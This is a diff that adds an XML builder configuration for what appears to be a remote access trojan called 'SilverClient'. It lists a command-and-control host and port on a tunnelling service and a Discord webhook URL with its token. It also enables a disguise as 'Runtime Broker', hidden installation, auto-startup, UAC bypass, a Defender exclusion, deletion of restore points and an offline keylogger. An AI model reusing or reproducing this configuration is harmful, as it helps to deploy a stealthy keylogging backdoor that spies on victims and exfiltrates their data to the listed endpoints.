@@ -1,0 +1,58 @@
+<settings>
+  <Group>Runtime Broker</Group>
+  <DataEncryptionKey>BvvUmkLYTkODIxBFGGaDRJPAvNRBNI</DataEncryptionKey>
+  <NormalDNS>True</NormalDNS>
+  <Pastebin>False</Pastebin>
+  <Host>auto-london.gl.at.ply.gg</Host>
+  <Port>51655</Port>
+  <ProcessMetux>SilverMutex_kTAAZjMenK</ProcessMetux>
+  <Installation>True</Installation>
+  <AutoStartup>True</AutoStartup>
+  <Foldername>hgfdfd</Foldername>
+  <ProgramData>False</ProgramData>
+  <ProgramFiles>False</ProgramFiles>
+  <AppData>True</AppData>
+  <Processname>Runtime Broker</Processname>
+  <HiddenInstall>True</HiddenInstall>
+  <BlockAccessPath>True</BlockAccessPath>
+  <DeleteSystemRestorePoints>True</DeleteSystemRestorePoints>
+  <BypassUAC>True</BypassUAC>
+  <KeyloaggarOfflien>True</KeyloaggarOfflien>
+  <DefeindrExclustion>True</DefeindrExclustion>
+  <HiddenProcess>True</HiddenProcess>
+  <BuilderCreateTask>False</BuilderCreateTask>
+  <BuilderRunTask>1</BuilderRunTask>
+  <Delay>True</Delay>
+  <NumDelay>0</NumDelay>
+  <ReconnectionDelay>True</ReconnectionDelay>
+  <NUMReconnectionDelay>0</NUMReconnectionDelay>
+  <SaveSettings>True</SaveSettings>
+  <BypassAV>False</BypassAV>
+  <PayloadName>SilverClient</PayloadName>
+  <EnableDiscord>True</EnableDiscord>
+  <URLDiscord>https://discord.com/api/webhooks/1246589640681586798/h16-VvKfKFx3sruiKoF82dP3cfD6Y8q0GzT6L8PIFDMiUjDJgKNDP4TuLM3uhEQesiKf</URLDiscord>
+  <exe>True</exe>
+  <com>False</com>
+  <cmd>False</cmd>
+  <pif>False</pif>
+  <scr>False</scr>
+  <AssemblyInformation>False</AssemblyInformation>
+  <Title>
+  </Title>
+  <Description>
+  </Description>
+  <Copyright>
+  </Copyright>
+  <Company>
+  </Company>
+  <Trademarks>
+  </Trademarks>
+  <Datemodified>False</Datemodified>
+  <DatemodifiedValue>28/09/2022 07:52:00</DatemodifiedValue>
+  <VR1>0</VR1>
+  <VR3>1</VR3>
+  <VR4>2</VR4>
+  <Icon>False</Icon>
+  <IconPath>
+  </IconPath>
+</settings>
